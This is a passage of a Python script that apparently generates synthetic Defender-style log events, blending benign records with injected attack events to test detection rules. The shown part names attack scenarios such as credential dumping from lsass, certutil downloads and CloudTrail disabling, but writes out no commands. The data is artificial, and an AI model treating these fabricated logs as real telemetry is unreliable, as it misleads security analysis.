        "Url": rng.choice(safe_urls),
        "ActionType": "ClickAllowed",
        "AccountUpn": rng.choice(_IDENTITY_UPNS),
        "NetworkMessageId": f"{uuid.uuid4()}@microsoft.com",
        "Workload": "Email",
        "IPAddress": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "IsClickedThrough": False,
        "UrlChain": None,
        "ThreatTypes": None,
        "DetectionMethods": None,
    }


def _generate_benign_identity_directory_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    # Routine directory events: password changes, group membership housekeeping
    action = rng.choice(["PasswordChanged", "AccountModified", "MemberAddedToGroup", "MemberRemovedFromGroup"])
    upn = rng.choice(_IDENTITY_UPNS)
    additional = (
        f'{{"GroupName":"{rng.choice(_AD_GROUPS)}"}}'
        if "Group" in action
        else "{}"
    )
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": action,
        "Application": "Active Directory",
        "TargetAccountUpn": upn,
        "TargetAccountDisplayName": upn.split("@")[0].capitalize(),
        "TargetDeviceName": None,
        "DestinationDeviceName": rng.choice(_DCS),
        "DestinationIPAddress": "10.0.0.1",
        "DestinationPort": 389,
        "Protocol": "LDAP",
        "AccountUpn": None,
        "AccountSid": None,
        "AccountObjectId": None,
        "AccountDisplayName": None,
        "AccountName": user,
        "AccountDomain": domain,
        "DeviceName": device,
        "IPAddress": f"10.0.{rng.randint(0,10)}.{rng.randint(1,254)}",
        "Port": rng.randint(49152, 65535),
        "Location": None,
        "ISP": None,
        "CountryCode": None,
        "City": None,
        "AdditionalFields": additional,
    }


def _generate_benign_identity_query_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    # Normal LDAP/DNS lookups during authentication and group policy processing
    action = rng.choice(["LdapSearch", "DnsQuery", "SamrObjectQuery"])
    if action == "LdapSearch":
        query_type = "LDAP"
        query_target = rng.choice(_LDAP_SEARCH_BASES)
        dest_port = 389
    elif action == "DnsQuery":
        query_type = "DNS"
        query_target = f"{device}.corp.local"
        dest_port = 53
    else:
        query_type = "SAMR"
        query_target = f"{domain}\\domain users"
        dest_port = 445
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": action,
        "Application": "Active Directory",
        "QueryType": query_type,
        "QueryTarget": query_target,
        "Protocol": query_type,
        "AccountUpn": rng.choice(_IDENTITY_UPNS),
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "AccountObjectId": None,
        "AccountDisplayName": user,
        "AccountName": user,
        "AccountDomain": domain,
        "DeviceName": device,
        "IPAddress": f"10.0.{rng.randint(0,10)}.{rng.randint(1,254)}",
        "Port": rng.randint(49152, 65535),
        "DestinationDeviceName": rng.choice(_DCS),
        "DestinationIPAddress": "10.0.0.1",
        "DestinationPort": dest_port,
        "AdditionalFields": "{}",
    }


def _generate_benign_identity_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    upn = rng.choice(_IDENTITY_UPNS)
    username = upn.split("@")[0]
    sid = f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001"
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "AccountUpn": upn,
        "AccountObjectId": str(uuid.uuid4()),
        "AccountDisplayName": username.capitalize(),
        "AccountDomain": domain,
        "AccountName": username,
        "AccountSid": sid,
        "GivenName": username.capitalize(),
        "Surname": "Employee",
        "Department": rng.choice(["Engineering", "Finance", "HR", "Sales", "IT", "Operations"]),
        "JobTitle": rng.choice(["Senior Analyst", "Engineer", "Manager", "Coordinator", "Specialist"]),
        "OfficeLocation": rng.choice(["HQ-Floor3", "Remote", "Branch-London"]),
        "City": rng.choice(["New York", "London", "Seattle"]),
        "Country": rng.choice(["US", "GB", "US"]),
        "IsAccountEnabled": True,
        "Manager": rng.choice(_IDENTITY_UPNS),
        "Phone": f"+1-555-{rng.randint(100,999)}-{rng.randint(1000,9999)}",
        "MFAEnabled": True,
        "AssignedRoles": None,
        "EmailAddress": upn.replace(".local", ".com"),
        "ProxyAddresses": [upn.replace(".local", ".com")],
        "Tags": None,
        "OnPremSid": sid,
        "CloudSid": None,
    }


def _generate_benign_identity_account_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    upn = rng.choice(_IDENTITY_UPNS)
    username = upn.split("@")[0]
    sid = f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001"
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "AccountObjectId": str(uuid.uuid4()),
        "AccountUpn": upn,
        "AccountDisplayName": username.capitalize(),
        "AccountDomain": domain,
        "AccountName": username,
        "AccountSid": sid,
        "OnPremSid": sid,
        "IsAccountEnabled": True,
        "IsLicensed": True,
        "AssignedLicenses": [rng.choice(["Microsoft 365 E3", "Microsoft 365 E5", "Exchange Online Plan 1"])],
        "Department": rng.choice(["Engineering", "Finance", "HR", "Sales", "IT"]),
        "JobTitle": rng.choice(["Engineer", "Analyst", "Manager"]),
        "Manager": rng.choice(_IDENTITY_UPNS),
        "OfficeLocation": rng.choice(["HQ-Floor3", "Remote"]),
        "AccountType": rng.choice(["User", "User", "ServiceAccount"]),
        "AdditionalFields": "{}",
    }


def _generate_benign_identity_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    # Generic identity events: MFA challenges, token issuance, session creation
    upn = rng.choice(_IDENTITY_UPNS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": rng.choice(["SessionCreated", "MFAChallengeCompleted", "TokenIssued", "PasswordResetCompleted"]),
        "Application": rng.choice(["Microsoft Entra ID", "Active Directory", "Microsoft Authenticator"]),
        "TargetAccountUpn": None,
        "TargetAccountDisplayName": None,
        "AccountUpn": upn,
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "AccountObjectId": str(uuid.uuid4()),
        "AccountDisplayName": upn.split("@")[0].capitalize(),
        "AccountName": user,
        "AccountDomain": domain,
        "DeviceName": device,
        "IPAddress": f"10.0.{rng.randint(0,10)}.{rng.randint(1,254)}",
        "Port": None,
        "DestinationDeviceName": None,
        "DestinationIPAddress": None,
        "DestinationPort": None,
        "Protocol": None,
        "AdditionalFields": "{}",
    }


# AbnormalThreatEvents and AbnormalCaseEvents have no benign generators —
# every Abnormal record represents a detection by definition.

_BENIGN_GENERATORS = {
    # Core device telemetry
    "DeviceProcessEvents":        _generate_benign_process_event,
    "DeviceNetworkEvents":        _generate_benign_network_event,
    "DeviceLogonEvents":          _generate_benign_logon_event,
    "DeviceRegistryEvents":       _generate_benign_registry_event,
    "DeviceImageLoadEvents":      _generate_benign_image_load_event,
    "DeviceInfo":                 _generate_benign_device_info,
    "DeviceNetworkInfo":          _generate_benign_device_network_info,
    "DeviceFileCertificateInfo":  _generate_benign_file_certificate_info,
    # Cloud and network security
    "AWSCloudTrailEvents":        _generate_benign_cloudtrail_event,
    "CloudflareHttpEvents":       _generate_benign_cloudflare_http_event,
    "CloudflareDnsEvents":        _generate_benign_cloudflare_dns_event,
    "CloudflareFirewallEvents":   _generate_benign_cloudflare_firewall_event,
    "ZscalerWebEvents":           _generate_benign_zscaler_web_event,
    "ZscalerDnsEvents":           _generate_benign_zscaler_dns_event,
    # Email tables
    "ProofpointMessageEvents":    _generate_benign_proofpoint_message_event,
    "ProofpointClickEvents":      _generate_benign_proofpoint_click_event,
    "EmailEvents":                _generate_benign_email_event,
    "EmailAttachmentInfo":        _generate_benign_email_attachment_info,
    "EmailPostDeliveryEvents":    _generate_benign_email_post_delivery_event,
    "EmailUrlInfo":               _generate_benign_email_url_info,
    "UrlClickEvents":             _generate_benign_url_click_event,
    # Identity tables
    "IdentityDirectoryEvents":    _generate_benign_identity_directory_event,
    "IdentityQueryEvents":        _generate_benign_identity_query_event,
    "IdentityInfo":               _generate_benign_identity_info,
    "IdentityAccountInfo":        _generate_benign_identity_account_info,
    "IdentityEvents":             _generate_benign_identity_event,
}


def generate(
    table: str,
    total_events: int,
    attack_ratio: float,
    scenario: str | None,
    seed: int,
) -> tuple[list[dict], dict]:
    """Generate synthetic log events.

    Returns:
        (events, manifest) tuple.
    """
    if table not in MDE_TABLES:
        raise ValueError(f"Unknown table '{table}'. Valid: {list(MDE_TABLES.keys())}")

    rng = random.Random(seed)
    now = datetime.now(timezone.utc)
    # Business hours distribution — 09:00-18:00 spread over the last 24h
    base_time = now - timedelta(hours=24)

    events: list[dict] = []
    attack_timestamps: list[str] = []
    malicious_count = 0
    mitre_techniques: list[str] = []
    expected_detections: list[str] = []

    attack_events: list[dict] = []
    if scenario and scenario in _ATTACK_SCENARIOS:
        scenario_data = _ATTACK_SCENARIOS[scenario]
        attack_events = scenario_data.get("events", [])
        mitre_techniques = scenario_data.get("mitre", [])
        expected_detections = scenario_data.get("detection_rules", [])

    malicious_total = int(total_events * attack_ratio)
    benign_total = total_events - malicious_total

    # Generate benign events with business-hours timestamps
    benign_gen = _BENIGN_GENERATORS.get(table)
    for i in range(benign_total):
        # Distribute over 9 hours of business activity
        minute_offset = rng.randint(0, 540)
        ts = _random_timestamp(base_time, minute_offset, rng)
        device = rng.choice(_DEVICE_NAMES)
        user = rng.choice(_USERNAMES)
        domain = rng.choice(_DOMAINS)

        if benign_gen:
            event = benign_gen(device, user, domain, ts, rng)
        else:
            event = {
                "Timestamp": ts,
                "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
                "DeviceName": device,
                "ActionType": rng.choice(ACTION_TYPES.get(table, ["Unknown"])),
                "ReportId": str(uuid.uuid4()),
            }
        events.append(event)

    # Inject attack events — clustered in last 2 hours for realistic timing
    attack_base = now - timedelta(hours=2)
    for i in range(malicious_total):
        if attack_events:
            template = rng.choice(attack_events).copy()
        else:
            template = {}

        ts = _random_timestamp(attack_base, i * 2, rng)
        attack_timestamps.append(ts)

        device = rng.choice(_DEVICE_NAMES[:5])  # Attacker uses fewer hosts
        user = rng.choice(_USERNAMES[:8])
        domain = rng.choice(_DOMAINS[:2])

        # Device tables carry process-/account-centric fields as a base.
        # Cloud, email, and network-security tables get all required fields
        # from the scenario template — don't pollute them with device noise.
        if table in _DEVICE_TABLE_NAMES:
            event = {
                "Timestamp": ts,
                "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
                "DeviceName": device,
                "AccountDomain": domain,
                "AccountName": user,
                "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
                "SHA256": _random_sha256(rng),
                "MD5": "".join(rng.choices("0123456789abcdef", k=32)),
                "ProcessId": rng.randint(1000, 65535),
                "InitiatingProcessId": rng.randint(100, 9999),
                "InitiatingProcessSHA256": _random_sha256(rng),
                "InitiatingProcessAccountName": user,
                "LogonId": f"0x{rng.randint(100000, 999999):x}",
                "InitiatingProcessParentFileName": "cmd.exe",
                "ReportId": str(uuid.uuid4()),
                **template,
            }
        else:
            event = {
                "Timestamp": ts,
                "ReportId": str(uuid.uuid4()),
                **template,
            }
        event["Timestamp"] = ts  # template may carry its own Timestamp — always use the generated one
        events.append(event)
        malicious_count += 1

    # Shuffle to interleave benign and malicious events
    rng.shuffle(events)

    manifest = {
        "table": table,
        "total_events": len(events),
        "malicious_events": malicious_count,
        "scenario": scenario,
        "mitre_techniques": mitre_techniques,
        "expected_detections": expected_detections,
        "attack_timestamps": attack_timestamps,
        "seed": seed,
    }

    return events, manifest


# ---------------------------------------------------------------------------
# Demo plan — one entry per (table, scenario, total_events, attack_ratio)
# Covers every table that has an attack scenario. attack_ratio=1.0 for tables
# without benign generators (Abnormal) so only attack events are produced.
# ---------------------------------------------------------------------------

_DEMO_PLAN: list[tuple[str, str | None, int, float]] = [
    # (table, scenario, total_events, attack_ratio)
    # Core device telemetry
    ("DeviceProcessEvents",       "encoded-powershell",             500, 0.05),
    ("DeviceProcessEvents",       "lsass-dump",                     300, 0.05),
    ("DeviceProcessEvents",       "certutil-download",              300, 0.05),
    ("DeviceRegistryEvents",      "registry-persistence",           300, 0.05),
    ("DeviceNetworkEvents",       "lateral-movement",               400, 0.05),
    ("DeviceLogonEvents",         "brute-force",                    500, 0.10),
    ("DeviceImageLoadEvents",     "dll-hijacking",                  400, 0.05),
    ("DeviceInfo",                None,                             100, 0.00),
    ("DeviceNetworkInfo",         None,                             100, 0.00),
    ("DeviceFileCertificateInfo", None,                             200, 0.00),
    # Cloud and network security
    ("AWSCloudTrailEvents",       "aws-root-usage",                 300, 0.05),
    ("AWSCloudTrailEvents",       "aws-cloudtrail-disable",         200, 0.05),
    ("AWSCloudTrailEvents",       "aws-iam-escalation",             200, 0.05),
    ("CloudflareFirewallEvents",  "cloudflare-waf-spike",           200, 0.20),
    ("CloudflareDnsEvents",       "cloudflare-dns-threat",          200, 0.05),
    ("ZscalerWebEvents",          "zscaler-malware-download",       300, 0.05),
    ("ZscalerWebEvents",          "zscaler-dlp",                    300, 0.05),
    ("ZscalerDnsEvents",          "zscaler-dns-sinkhole",           200, 0.05),
    # Email tables
    ("ProofpointMessageEvents",   "proofpoint-phish-verymalicious", 150, 0.10),
    ("ProofpointMessageEvents",   "proofpoint-impostor-delivered",  150, 0.10),
    ("ProofpointMessageEvents",   "proofpoint-malware-sandbox",     150, 0.10),
    ("ProofpointClickEvents",     "proofpoint-click-blocked",        80, 0.15),
    ("AbnormalThreatEvents",      "abnormal-bec-vip",                 1, 1.00),
    ("AbnormalThreatEvents",      "abnormal-cross-layer-phish",       1, 1.00),
    ("AbnormalCaseEvents",        "abnormal-case-high-severity",      1, 1.00),
    ("EmailEvents",               "mdo-phish-delivered",            300, 0.05),
    ("EmailAttachmentInfo",       "mdo-malicious-attachment",       200, 0.05),
    ("EmailPostDeliveryEvents",   "mdo-zap",                        100, 0.10),
    ("EmailUrlInfo",              None,                             200, 0.00),
    ("UrlClickEvents",            "url-click-blocked",              200, 0.05),
    # Identity tables
    ("IdentityDirectoryEvents",   "ad-privilege-escalation",        300, 0.05),
    ("IdentityQueryEvents",       "ldap-recon",                     400, 0.10),
    ("IdentityInfo",              None,                              50, 0.00),
    ("IdentityAccountInfo",       None,                              50, 0.00),
    ("IdentityEvents",            None,                             200, 0.00),
]


def _ingest_to_storage(events: list[dict[str, Any]], table: str) -> tuple[int, int]:
    """Normalize events and write to hive-style storage partitions.

    Returns (written_count, skipped_count).
    """
    from backend.exceptions import SchemaException
    from backend.ingest.normalizer import normalize
    from backend.ingest.writer import write_parquet

    normalized: list[dict[str, Any]] = []
    skipped = 0
    for event in events:
        try:
            normalized.append(normalize(event, table))
        except SchemaException as exc:
            skipped += 1
            if skipped <= 3:
                logger.warning("Skipped event for %s: %s", table, exc.detail)
    if normalized:
        write_parquet(normalized, table)
    return len(normalized), skipped


def main():
    parser = argparse.ArgumentParser(
        description="Generate synthetic MDE-compatible log events",
    )
    parser.add_argument("--table", default=None, help="Target MDE table name (required unless --demo)")
    parser.add_argument("--events", type=int, default=1000, help="Total event count")
    parser.add_argument("--attack-ratio", type=float, default=0.05, help="Fraction of malicious events")
    parser.add_argument("--scenario", default=None, choices=list(_ATTACK_SCENARIOS.keys()),
                        metavar="SCENARIO", help=f"Attack scenario: {', '.join(_ATTACK_SCENARIOS)}")
    parser.add_argument("--output", default="./generated", help="Output directory for JSONL/Parquet")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    parser.add_argument(
        "--to-storage",
        action="store_true",
        help=(
            "Normalize events and write directly to storage/ hive partitions "
            "so they are immediately queryable via DuckDB views. "
            "Requires the backend to be importable."
        ),
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help=(
            "Generate a full-platform demo dataset: all attack scenarios across all tables, "
            "written to storage/ hive partitions. Implies --to-storage. "
            "Start the backend server after running this to see all detections fire."
        ),
    )
    args = parser.parse_args()

    # ------------------------------------------------------------------
    # --demo: generate all scenarios for all tables and ingest to storage
    # ------------------------------------------------------------------
    if args.demo:
        print("Generating full demo dataset...")
        combined_manifest: list[dict] = []
        total_written = 0
        total_skipped = 0
        for table, scenario, n_events, attack_ratio in _DEMO_PLAN:
            events, manifest = generate(
                table=table,
                total_events=n_events,
                attack_ratio=attack_ratio,
                scenario=scenario,
                seed=args.seed,
            )
            written, skipped = _ingest_to_storage(events, table)
            total_written += written
            total_skipped += skipped
            combined_manifest.append({**manifest, "written": written, "skipped": skipped})
            print(
                f"  {table:<32} scenario={scenario:<38} "
                f"written={written:>4}  skipped={skipped}"
            )

        ts_str = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        manifest_path = Path(args.output) / f"demo_manifest_{ts_str}.json"
        manifest_path.parent.mkdir(parents=True, exist_ok=True)
        with manifest_path.open("w") as f:
            json.dump(combined_manifest, f, indent=2, default=str)

        print(f"\nTotal events written to storage: {total_written}")
        if total_skipped:
            print(f"Skipped (schema validation): {total_skipped}")
        print(f"Manifest: {manifest_path}")
        print("\nStart (or restart) the backend server — DuckDB views will cover the new data.")
        print("The detection runner will fire on the next cycle (default: 5 min).")
        all_rules = sorted({r for m in combined_manifest for r in m.get("expected_detections", [])})
        if all_rules:
            print(f"Expected alerts: {', '.join(all_rules)}")
        return

    # ------------------------------------------------------------------
    # Single-table mode
    # ------------------------------------------------------------------
    if not args.table:
        parser.error("--table is required unless --demo is specified")

    print(f"Generating {args.events} events for {args.table} (scenario: {args.scenario})...")
    events, manifest = generate(
        table=args.table,
        total_events=args.events,
        attack_ratio=args.attack_ratio,
        scenario=args.scenario,
        seed=args.seed,
    )

    if args.to_storage:
        written, skipped = _ingest_to_storage(events, args.table)
        print(f"Written to storage: {written} events (skipped: {skipped})")
        if manifest["mitre_techniques"]:
            print(f"MITRE techniques: {', '.join(manifest['mitre_techniques'])}")
        if manifest["expected_detections"]:
            print(f"Expected alerts:  {', '.join(manifest['expected_detections'])}")
        return

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    ts_str = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    jsonl_path = output_dir / f"{args.table}_{ts_str}.jsonl"
    manifest_path = output_dir / f"manifest_{ts_str}.json"

    with jsonl_path.open("w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    with manifest_path.open("w") as f:
        json.dump(manifest, f, indent=2, default=str)

    # Write Parquet to output dir
    try:
        import pandas as pd
        import pyarrow as pa
        import pyarrow.parquet as pq

        parquet_path = output_dir / f"{args.table}_{ts_str}.parquet"
        df = pd.DataFrame(events)
        pq.write_table(pa.Table.from_pandas(df, preserve_index=False), str(parquet_path))
        print(f"Parquet:  {parquet_path}")
    except ImportError:
        print("pyarrow not available — skipping Parquet output")

    print(f"JSONL:    {jsonl_path}")
    print(f"Manifest: {manifest_path}")
    print(f"Benign events:    {args.events - manifest['malicious_events']}")
    print(f"Malicious events: {manifest['malicious_events']}")
    if manifest["mitre_techniques"]:
        print(f"MITRE techniques: {', '.join(manifest['mitre_techniques'])}")
    if manifest["expected_detections"]:
        print(f"Expected alerts:  {', '.join(manifest['expected_detections'])}")


if __name__ == "__main__":
    main()
